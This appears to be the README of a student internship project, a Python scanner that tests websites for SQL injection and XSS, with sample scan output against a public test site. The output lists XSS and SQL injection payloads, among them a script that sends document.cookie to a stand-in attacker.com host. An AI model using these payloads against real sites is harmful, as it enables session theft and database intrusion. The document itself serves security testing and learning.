# CODTECH_ADVANCED_TASK_2
# Web Vulnerability Scanner

## Personal information 
Name: Priyanshu Vijay Singh
Company: CODTECH IT SOLUTIONS
ID•. CT08FFC
Domain: Cyber Security
Duration: 20 dec 2024 to 20 jan 2025
Mentor: Neela Santhosh Kumar

## Overview

This is a simple Python-based tool designed to scan websites for common vulnerabilities, including SQL injection and Cross-Site Scripting (XSS). The tool uses various techniques to detect these vulnerabilities and generates a detailed report. It utilizes the `requests`, `BeautifulSoup`, and `pyfiglet` libraries for web scraping and logging purposes.

## Features

- **SQL Injection Detection**: Identifies SQL injection vulnerabilities by testing various SQL payloads in URL parameters.
- **Cross-Site Scripting (XSS) Detection**: Detects both reflected and stored XSS vulnerabilities by injecting common XSS payloads.
- **Form Scanning**: Scans HTML forms for potential XSS vulnerabilities.
- **Multi-Page Scanning**: The scanner follows links within the same domain to detect vulnerabilities across multiple pages.
- **Logging and Reporting**: Generates a detailed vulnerability report, including the type, severity, and evidence for each identified vulnerability.

## Installation

#### 1. Clone The repository : 

```bash 
git clone https://github.com/hipremsoni/CODTECH_ADVANCED_TASK_2.git
cd CODTECH_ADVANCED_TASK_2
```

#### 2. Install the required Python packages using `pip` :

```bash 
pip install -r requirements.txt 
```

#### 3. Run The Tool :
```bash 
python3 web_vuln_scanner.py 
```

### Prerequisites

- Python 3.x
- Pip (Python package installer)

The `requirements.txt` file should include:

```text
requests
beautifulsoup4
pyfiglet
colorama
```

## Usage

### Running the Scanner

1. Run the script:

```bash
python web_vuln_scanner.py
```

2. You will be prompted to enter the target website URL (e.g., `http://example.com`).

3. The scanner will analyze the website and its links, testing for common vulnerabilities such as SQL injection and XSS.

4. After the scan completes, a detailed report will be displayed on the terminal.
### Screenshots
![image-1](https://github.com/user-attachments/assets/f1acb96d-21ee-486d-a02c-cae57504666d)
![image-2](https://github.com/user-attachments/assets/84699664-a003-48ab-a4cf-105b23fa8d24)

### Example


```bash
__        __   _      __     __     _       
\ \      / /__| |__   \ \   / /   _| |_ __
 \ \ /\ / / _ \ '_ \   \ \ / / | | | | '_ \
  \ V  V /  __/ |_) |   \ V /| |_| | | | | |
   \_/\_/ \___|_.__/     \_/  \__,_|_|_| |_|

 ____
/ ___|  ___ __ _ _ __  _ __   ___ _ __
\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 ___) | (_| (_| | | | | | | |  __/ |
|____/ \___\__,_|_| |_|_| |_|\___|_|


- Created by Premkumar Soni
Welcome to the Web Application Vulnerability Scanner!

Enter the target website URL (e.g., http://example.com): http://testphp.vulnweb.com
[Scanning] http://testphp.vulnweb.com
[Scanning] http://testphp.vulnweb.com/privacy.php
2025-01-15 11:18:28,918 - ERROR - Error scanning http://testphp.vulnweb.com/privacy.php: 404 Client Error: Not Found for url: http://testphp.vulnweb.com/privacy.php
[Scanning] http://testphp.vulnweb.com/guestbook.php
[Scanning] http://testphp.vulnweb.com/userinfo.php
[Scanning] http://testphp.vulnweb.com/disclaimer.php
[Scanning] http://testphp.vulnweb.com/Mod_Rewrite_Shop/
[Scanning] http://testphp.vulnweb.com/categories.php
[Scanning] http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
[Scanning] http://testphp.vulnweb.com/login.php
[Scanning] http://testphp.vulnweb.com/listproducts.php?cat=2
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <script>alert('XSS')</script>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <img src=x onerror=alert(1)>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <svg/onload=alert(1)>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: "><img src=x onerror=alert(1)>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <img src=1 onerror=alert(document.cookie)>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <script>prompt(1)</script>
[Reflected XSS Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' reflected payload: <script>confirm(1)</script>
[SQL Injection Detected] http://testphp.vulnweb.com/listproducts.php?cat=2
Evidence: Parameter 'cat' vulnerable to payload: ' OR '1'='1

 ____                    ____                       _
/ ___|  ___ __ _ _ __   |  _ \ ___ _ __   ___  _ __| |_
\___ \ / __/ _` | '_ \  | |_) / _ \ '_ \ / _ \| '__| __|
 ___) | (_| (_| | | | | |  _ <  __/ |_) | (_) | |  | |_
|____/ \___\__,_|_| |_| |_| \_\___| .__/ \___/|_|   \__|
                                  |_|

Target: http://testphp.vulnweb.com
Scan Date: 2025-01-15T11:18:48.820498
Pages Scanned: 10

Vulnerabilities Found:

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <script>alert('XSS')</script>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <img src=x onerror=alert(1)>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <svg/onload=alert(1)>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: "><img src=x onerror=alert(1)>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <img src=1 onerror=alert(document.cookie)>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <script>prompt(1)</script>
---

Type: Reflected XSS
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: High
Description: Reflected XSS vulnerability detected.
Evidence: Parameter 'cat' reflected payload: <script>confirm(1)</script>
---

Type: SQL Injection
URL: http://testphp.vulnweb.com/listproducts.php?cat=2
Severity: Critical
Description: SQL Injection vulnerability detected.
Evidence: Parameter 'cat' vulnerable to payload: ' OR '1'='1
```

## Acknowledgements

- `requests` for making HTTP requests.
- `BeautifulSoup` for parsing HTML.
- `pyfiglet` for generating ASCII art.
- `colorama` for adding color to terminal output.

---

### Notes

- The tool is intended for educational purposes only. Use it responsibly and only on websites you own or have explicit permission to test.
- This tool is a basic implementation of a web vulnerability scanner and can be extended with additional vulnerability detection techniques.

---
